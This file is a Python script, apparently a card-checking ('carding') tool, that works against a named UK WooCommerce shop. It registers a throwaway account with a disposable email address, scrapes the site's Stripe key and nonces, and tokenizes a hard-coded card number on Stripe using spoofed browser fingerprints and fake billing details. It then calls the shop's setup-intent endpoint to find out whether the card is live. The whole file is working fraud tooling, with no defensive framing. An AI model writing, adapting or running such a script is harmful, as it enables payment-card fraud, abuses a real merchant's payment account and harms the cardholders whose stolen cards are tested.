# language: Python 3.12+, file: test_single.py, target: Windows 11
import asyncio
import json
import random
import re
import string
import uuid
import aiohttp

DONOR = "https://www.thetrendywhippet.co.uk"
ADD_PM_URL = f"{DONOR}/my-account/add-payment-method/"
AJAX_URL = f"{DONOR}/wp-admin/admin-ajax.php"
WC_AJAX_URL = f"{DONOR}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent"
STRIPE_PM_URL = "https://api.stripe.com/v1/payment_methods"

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")


def rand_str(k=10):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=k))


async def test(card_raw):
    num, mm, yy, cvc = card_raw.split("|")
    yy = "20" + yy[-2:]
    card = {"number": num, "month": mm.zfill(2), "year": yy, "cvc": cvc}

    jar = aiohttp.CookieJar(unsafe=True)
    async with aiohttp.ClientSession(headers={"User-Agent": UA}, cookie_jar=jar) as s:
        print(f"[*] 1. Fetching {ADD_PM_URL}...", flush=True)
        async with s.get(ADD_PM_URL, ssl=False) as r:
            html = await r.text()
            print(f"    Status: {r.status}, Final: {r.url}, len={len(html)}", flush=True)

        m_reg = re.search(r'woocommerce-register-nonce["\']?\s*value=["\']([a-f0-9]{10})["\']', html)
        reg_nonce = m_reg.group(1) if m_reg else ""
        print(f"[*] 2. Register nonce: {reg_nonce}", flush=True)

        if not reg_nonce:
            print("[-] No register nonce found.")
            return

        uname = rand_str(10)
        email = f"{uname}@mailnesia.com"
        pwd = f"Pass_{rand_str(12)}!9"
        reg_body = {
            "username": uname,
            "email": email,
            "password": pwd,
            "woocommerce-register-nonce": reg_nonce,
            "_wp_http_referer": "/my-account/add-payment-method/",
            "register": "Register",
        }
        print(f"[*] 3. Registering account: {email}...", flush=True)
        async with s.post(ADD_PM_URL, data=reg_body, ssl=False,
                          headers={"Origin": DONOR, "Referer": ADD_PM_URL}) as r:
            reg_resp = await r.text()
            print(f"    Reg status: {r.status}, Final: {r.url}", flush=True)

        cookies = [c.key for c in s.cookie_jar]
        print(f"    Cookies: {cookies}", flush=True)
        logged_in = any("wordpress_logged_in" in c for c in cookies)
        print(f"    Logged in: {logged_in}", flush=True)

        # Scrape logged-in page for UPE params
        print(f"[*] 4. Scraping fresh UPE params...", flush=True)
        async with s.get(ADD_PM_URL, ssl=False) as r:
            logged_html = await r.text()

        m_upe = re.search(r"var wc_stripe_upe_params = (\{.*?\});\s*</script>", logged_html, re.S)
        if not m_upe:
            print("[-] wc_stripe_upe_params not found on logged-in page.")
            return

        upe = json.loads(m_upe.group(1))
        pk = upe.get("key", "")
        setup_nonce = upe.get("createAndConfirmSetupIntentNonce", "")
        print(f"    pk: {pk[:25]}...")
        print(f"    setup_nonce: {setup_nonce}")

        # Tokenize card on Stripe
        print(f"[*] 5. Tokenizing card {num[:6]}******{num[-4:]} on Stripe...", flush=True)
        fp_guid = str(uuid.uuid4())
        fp_muid = str(uuid.uuid4())
        fp_sid = str(uuid.uuid4())

        tok_body = {
            "type": "card",
            "billing_details[name]": "Alex Taylor",
            "billing_details[address][postal_code]": "SW1A 1AA",
            "billing_details[address][country]": "GB",
            "card[number]": card["number"],
            "card[cvc]": card["cvc"],
            "card[exp_month]": card["month"],
            "card[exp_year]": card["year"],
            "guid": fp_guid,
            "muid": fp_muid,
            "sid": fp_sid,
            "pasted_fields": "number,cvc",
            "payment_user_agent": "stripe.js/916d815941; stripe-js-v3/916d815941; payment-element; deferred-intent",
            "referrer": DONOR,
            "time_on_page": "35400",
            "client_attribution_metadata[client_session_id]": str(uuid.uuid4()),
            "client_attribution_metadata[merchant_integration_source]": "elements",
            "client_attribution_metadata[merchant_integration_subtype]": "card-element",
            "client_attribution_metadata[merchant_integration_version]": "2017",
            "key": pk,
        }
        async with s.post(STRIPE_PM_URL, data=tok_body, ssl=False,
                          headers={"Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/",
                                   "Accept": "application/json"}) as r:
            tok_resp = await r.json(content_type=None)

        pm_id = tok_resp.get("id")
        print(f"    Tokenize response: pm_id={pm_id}, brand={tok_resp.get('card', {}).get('brand')}, cvc_check={tok_resp.get('card', {}).get('checks', {}).get('cvc_check')}")
        if not pm_id:
            print(f"[-] Tokenize failed: {tok_resp}")
            return

        # Confirm SetupIntent via admin-ajax.php / wc-ajax
        print(f"[*] 6. Calling wc_stripe_create_and_confirm_setup_intent...", flush=True)
        setup_data = {
            "action": "wc_stripe_create_and_confirm_setup_intent",
            "_ajax_nonce": setup_nonce,
            "wc-stripe-payment-method": pm_id,
            "wc-stripe-payment-type": "card",
        }
        headers = {
            "Origin": DONOR,
            "Referer": ADD_PM_URL,
            "X-Requested-With": "XMLHttpRequest",
            "Accept": "application/json"
        }
        
        async with s.post(AJAX_URL, data=setup_data, headers=headers, ssl=False) as r:
            ajax_resp = await r.text()
            print(f"    admin-ajax status: {r.status}, resp: {ajax_resp[:300]}")


if __name__ == "__main__":
    asyncio.run(test("4420196749812053|02|33|924"))
